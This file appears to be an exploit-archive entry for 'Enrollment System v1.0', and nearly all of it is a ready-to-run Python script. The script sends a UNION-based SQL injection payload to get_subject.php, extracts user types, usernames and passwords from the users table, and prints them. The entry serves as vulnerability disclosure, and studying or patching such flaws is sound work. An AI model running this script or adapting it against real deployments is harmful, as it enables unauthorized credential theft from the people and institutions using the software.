@@ -1,0 +1,96 @@
+id: 39397
+date: 03/04/2024
+title: Enrollment System v1.0 - SQL Injection Exploit
+author: Gnanaraj Mauviel
+cves: 
+
+# Exploit Title: Enrollment System v1.0 - SQL Injection
+# Exploit Author: Gnanaraj Mauviel (@0xm3m)
+# Vendor: Obi08
+# Vendor Homepage: https://github.com/Obi08/Enrollment_System
+# Software Link: https://github.com/Obi08/Enrollment_System
+# Version: v1.0
+# Tested on: Mac OSX, XAMPP, Apache, MySQL
+
+-------------------------------------------------------------------------------------------------------------------------------------------
+
+from bs4 import BeautifulSoup
+import requests
+import urllib3
+
+#The Config class defines three class attributes: BASE_URL, URI, and PAYLOAD.
+
+#BASE_URL is set to the string "http://localhost/enrollment_system".
+#URI is set to the string "/get_subject.php".
+#PAYLOAD is set to the string "emc' union select 1,concat(user_type,'::',username,'::',password),3,4,5,6 from users-- -".
+
+class Config:
+    BASE_URL = "http://localhost/enrollment_system"
+    URI = '/get_subject.php'
+    PAYLOAD = "emc' union select 1,concat(user_type,'::',username,'::',password),3,4,5,6 from users-- -"
+
+urllib3.disable_warnings()
+proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
+
+#This code defines a function called exploit_sqli that exploits a SQL injection vulnerability in a given URL. It takes in a requests.Session object and a Config object as parameters. The function constructs a URL using the BASE_URL and URI properties from the Config object, and creates a dictionary of parameters with a key of 'keyword' and a value of the PAYLOAD property from the Config object.
+#The function then tries to make a request using the make_request function and returns the response text if successful. If an exception is raised during the request, it prints an error message and returns an empty string.
+
+def exploit_sqli(session: requests.Session, config: Config) -> str:
+    """
+    Exploits SQL injection vulnerability in the given URL.
+
+    Args:
+        session (requests.Session): The session object to use for making the request.
+        config (Config): Configuration object containing base URL, URI, and payload.
+
+    Returns:
+        str: The response text from the request.
+    """
+    url = f"{config.BASE_URL}{config.URI}"
+    params = {'keyword': config.PAYLOAD}
+    
+    try:
+        response = make_request(session, url, params)
+        return response.text
+    except requests.RequestException as e:
+        print(f"Request failed: {e}")
+        return ""
+    
+#This code defines a function called make_request that takes in a requests.Session object, a URL string, and a dictionary of parameters. It makes a POST request using the provided session and parameters, and returns the response object. The function has type hints indicating the types of the arguments and the return value.    
+
+def make_request(session: requests.Session, url: str, params: dict) -> requests.Response:
+    """
+    Make a POST request with error handling.
+
+    Args:
+        session (requests.Session): The session object to use for making the request.
+        url (str): The URL to send the request to.
+        params (dict): The parameters to include in the request.
+
+    Returns:
+        requests.Response: The response object.
+    """
+    return session.post(url, data=params, verify=False, proxies=proxies)
+
+#This code snippet defines a function called parse_html that takes a string parameter response_text. It uses the BeautifulSoup library to parse the HTML in response_text and extract specific data from it. It finds all <tr> elements in the HTML, skips the header row, and then iterates over the remaining rows. For each row, it finds all <td> elements and extracts the text content from the second and third column. Finally, it prints a formatted string that includes the extracted data.
+
+def parse_html(response_text: str):
+    soup = BeautifulSoup(response_text, 'html.parser')
+    rows = soup.find_all('tr')[1:]  # Skip the header row
+
+    for row in rows:
+        columns = row.find_all('td')
+        if columns:
+            subject_code = columns[1].text.strip()
+            subject_description = columns[2].text.strip()
+            print(f"User_Type::Username::Password == {subject_code}")
+
+if __name__ == "__main__":
+    # file deepcode ignore MissingClose: <please specify a reason of ignoring this>
+    session = requests.Session()
+    response = exploit_sqli(session, Config)
+    
+    if response:
+        parse_html(response)
+
+#  0day.today [2024-03-06]  #
